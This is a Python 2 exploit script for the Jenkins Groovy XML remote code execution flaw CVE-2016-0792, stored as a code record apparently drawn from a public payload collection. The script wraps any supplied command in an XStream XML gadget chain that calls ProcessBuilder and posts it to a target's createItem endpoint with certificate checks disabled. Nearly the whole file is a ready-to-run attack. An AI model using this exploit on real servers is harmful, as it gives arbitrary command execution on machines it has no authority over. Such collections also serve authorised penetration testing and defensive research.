{
    "code": "#! /usr/bin/env python2\n\n#Jenkins Groovy XML RCE (CVE-2016-0792)\n#Note: Although this is listed as a pre-auth RCE, during my testing it only worked if authentication was disabled in Jenkins\n#Made with <3 by @byt3bl33d3r\n\nfrom __future__ import print_function\nimport requests\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n\nimport argparse\nimport sys\n\nparser = argparse.ArgumentParser()\nparser.add_argument('target', type=str, help='Target IP:PORT')\nparser.add_argument('command', type=str, help='Command to run on target')\nparser.add_argument('--proto', choices={'http', 'https'}, default='http', help='Send exploit over http or https (default: http)')\n\nif len(sys.argv) < 2:\n    parser.print_help()\n    sys.exit(1)\n\nargs = parser.parse_args()\n\nif len(args.target.split(':')) != 2:\n    print('[-] Target must be in format IP:PORT')\n    sys.exit(1)\n\nif not args.command:\n    print('[-] You must specify a command to run')\n    sys.exit(1)\n\nip, port = args.target.split(':')\n\nprint('[*] Target IP: {}'.format(ip))\nprint('[*] Target PORT: {}'.format(port))\n\nxml_formatted = ''\ncommand_list = args.command.split()\nfor cmd in command_list:\n    xml_formatted += '{:>16}<string>{}</string>\\n'.format('', cmd)\n\nxml_payload = '''<map>\n  <entry>\n    <groovy.util.Expando>\n      <expandoProperties>\n        <entry>\n          <string>hashCode</string>\n          <org.codehaus.groovy.runtime.MethodClosure>\n            <delegate class=\"groovy.util.Expando\" reference=\"../../../..\"/>\n            <owner class=\"java.lang.ProcessBuilder\">\n              <command>\n                {}\n              </command>\n              <redirectErrorStream>false</redirectErrorStream>\n            </owner>\n            <resolveStrategy>0</resolveStrategy>\n            <directive>0</directive>\n            <parameterTypes/>\n            <maximumNumberOfParameters>0</maximumNumberOfParameters>\n            <method>start</method>\n          </org.codehaus.groovy.runtime.MethodClosure>\n        </entry>\n      </expandoProperties>\n    </groovy.util.Expando>\n   <int>1</int>\n </entry>\n</map>'''.format(xml_formatted.strip())\n\nprint('[*] Generated XML payload:')\nprint(xml_payload)\nprint() \n\nprint('[*] Sending payload')\nheaders = {'Content-Type': 'text/xml'}\nr = requests.post('{}://{}:{}/createItem?name=rand_dir'.format(args.proto, ip, port), verify=False, headers=headers, data=xml_payload)\n\npaths_in_trace = ['jobs/rand_dir/config.xml', 'jobs\\\\rand_dir\\\\config.xml']\nif r.status_code == 500:\n    for path in paths_in_trace:\n        if path in r.text:\n            print('[+] Command executed successfully')\n            break",
    "source": "github_repo:swisskyrepo/PayloadsAllTheThings",
    "file": "CVE Exploits/Jenkins CVE-2016-0792.py",
    "license": "MIT",
    "language": "python"
}